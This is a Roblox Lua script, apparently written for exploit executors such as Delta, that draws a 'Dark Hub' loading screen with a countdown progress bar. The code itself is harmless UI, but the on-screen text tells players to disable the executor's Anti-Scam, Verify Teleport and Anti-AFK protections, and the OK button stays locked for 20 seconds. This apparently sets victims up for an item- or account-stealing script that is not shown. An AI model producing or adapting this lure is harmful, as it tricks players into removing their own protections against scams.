-- Dark Hub Loading Screen with Progress Bar + Fade Out (Client-Sided UI)
-- For educational purposes only. This does not affect the actual game.
-- Works with executors like Delta

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")

-- Create ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "DarkHubLoading"
gui.ResetOnSpawn = false
gui.Parent = PlayerGui

-- Background Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 240)
frame.Position = UDim2.new(0.5, -200, 0.5, -120)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
frame.Parent = gui

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "⚠ Turn off all on Delta settings ⚠"
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.Parent = frame

-- Instructions
local text = Instance.new("TextLabel")
text.Size = UDim2.new(1, -20, 0, 100)
text.Position = UDim2.new(0, 10, 0, 45)
text.BackgroundTransparency = 1
text.TextXAlignment = Enum.TextXAlignment.Left
text.TextYAlignment = Enum.TextYAlignment.Top
text.Font = Enum.Font.Gotham
text.TextSize = 16
text.TextColor3 = Color3.fromRGB(255, 255, 255)
text.Text = "1. Disable Anti-AFK\n2. Disable Verify Teleport\n3. Disable Anti-Scam\n\n☑ After disabling, press OK to continue."
text.Parent = frame

-- Progress Bar Background
local progressBg = Instance.new("Frame")
progressBg.Size = UDim2.new(1, -40, 0, 20)
progressBg.Position = UDim2.new(0, 20, 1, -80)
progressBg.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
progressBg.BorderSizePixel = 0
progressBg.Parent = frame
Instance.new("UICorner", progressBg)

-- Progress Fill
local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(50, 200, 100)
progressFill.BorderSizePixel = 0
progressFill.Parent = progressBg
Instance.new("UICorner", progressFill)

-- Okay Button (starts disabled with timer)
local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 120, 0, 40)
button.Position = UDim2.new(0.5, -60, 1, -40)
button.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
button.Text = "Wait 20s..."
button.Font = Enum.Font.GothamBold
button.TextSize = 18
button.TextColor3 = Color3.fromRGB(200, 200, 200)
button.Parent = frame
button.Active = false
button.AutoButtonColor = false
Instance.new("UICorner", button)

-- Button Function (with fade-out)
button.MouseButton1Click:Connect(function()
    if button.Active then
        local fadeTween = TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 1})
        fadeTween:Play()
        for _, obj in ipairs(frame:GetDescendants()) do
            if obj:IsA("TextLabel") or obj:IsA("TextButton") then
                TweenService:Create(obj, TweenInfo.new(1), {TextTransparency = 1}):Play()
            elseif obj:IsA("Frame") then
                TweenService:Create(obj, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
            end
        end
        task.wait(1.1)
        gui:Destroy()
    end
end)

-- Draggable Frame
frame.Active = true
frame.Draggable = true

-- Countdown + Progress Bar Fill
local countdown = 20
for i = countdown, 0, -1 do
    button.Text = "Wait " .. i .. "s..."
    progressFill:TweenSize(UDim2.new((countdown - i) / countdown, 0, 1, 0), "Out", "Linear", 1, true)
    task.wait(1)
end

-- Unlock button
button.Text = "Okay"
button.BackgroundColor3 = Color3.fromRGB(50, 200, 100)
button.TextColor3 = Color3.fromRGB(0, 0, 0)
button.Active = true
button.AutoButtonColor = true
